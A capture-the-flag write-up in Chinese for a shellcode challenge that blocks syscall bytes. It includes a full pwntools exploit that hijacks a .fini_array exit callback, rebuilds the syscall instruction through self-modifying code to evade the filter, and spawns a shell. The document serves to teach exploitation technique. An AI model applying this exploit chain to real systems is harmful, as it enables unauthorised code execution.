# shellcode, but without syscall

## 题目简述

程序在固定地址 `0x20230000` 创建 RWX 映射，只允许输入不超过 `0x20` 字节的 shellcode，并把其中所有连续的 `0f 05` 改成 `90 90`。之后程序额外提供一次任意地址 8 字节写。二进制静态链接、无 PIE、无 RELRO，故可把可写 `.fini_array` 中的函数指针改为 RWX 映射，再用运行时自修改恢复 `syscall`，二次读取完整 shellcode。

## 解题过程

### 1. 用任意写劫持退出回调

源码最终执行：

```c
puts("Where?");
scanf("%p", &ptr);
puts("What?");
read(0, ptr, 8);
return 0;
```

正常返回后，C 运行时会调用 `.fini_array` 中的函数指针。随题二进制的该节起始于 `0x4db030`，第二个条目位于 `0x4db038`；将它改成 `0x20230000`，程序退出时便会执行第一阶段 shellcode。脚本直接从 ELF 节表计算位置，避免把地址散落在代码中。

### 2. 在检查后生成 `0f 05`

输入检查发生在执行之前，所以提交时不放 `0f 05`，而是放 `90 05`。下面的 RIP 相对 XOR 以 `0x9f` 修改下一条指令的低字节：

$$
\texttt{0x90}\oplus\texttt{0x9f}=\texttt{0x0f}.
$$

于是 `90 05` 在运行时变成 `0f 05`。第一阶段同时显式设置 `read(0, 0x20230000, 0x400)` 的四个寄存器，不依赖 `.fini_array` 调用时残留的偶然寄存器状态。

```python
import sys
from pwn import ELF, asm, context, p64, process, remote, shellcraft

context(arch="amd64", os="linux")

elf = ELF("./pwns", checksec=False)
shellcode_base = 0x20230000
fini_array = elf.get_section_by_name(".fini_array").header.sh_addr
fini_callback = fini_array + 8

if len(sys.argv) == 3:
    io = remote(sys.argv[1], int(sys.argv[2]))
else:
    io = process(elf.path)

prefix = asm(r"""
    xor eax, eax
    xor edi, edi
    mov esi, 0x20230000
    mov edx, 0x400
    xor dword ptr [rip], 0x9f
    nop
""")

# 提交时末尾为 90 05；执行 XOR 后变成 syscall。
stage0 = prefix + b"\x05"
assert len(stage0) <= 0x20
assert b"\x0f\x05" not in stage0

io.sendlineafter(b"Input your code length:\n", str(len(stage0)).encode())
io.sendafter(b"Now show me your code:\n", stage0)
io.sendlineafter(b"Where?\n", hex(fini_callback).encode())
io.sendafter(b"What?\n", p64(shellcode_base))

# syscall 返回到 stage0 末尾；前 0x20 字节 NOP 把执行流滑到完整 shellcode。
stage1 = b"\x90" * 0x20 + asm(shellcraft.sh())
io.send(stage1)
io.interactive()
```

NX 不影响本题，因为 `mmap` 区域本身具有执行权限；真正决定 `.fini_array` 能否改写的是 RELRO，而编译参数明确使用了 `-z norelro`。

## 方法总结

利用链由两个原语组成：任意 8 字节写负责把退出回调指向受控区域，运行时自修改负责绕过静态字节过滤并得到第二次 `read`。针对机器码的黑名单只能检查提交时的字节，无法阻止代码在可写可执行内存中自行构造被禁指令。
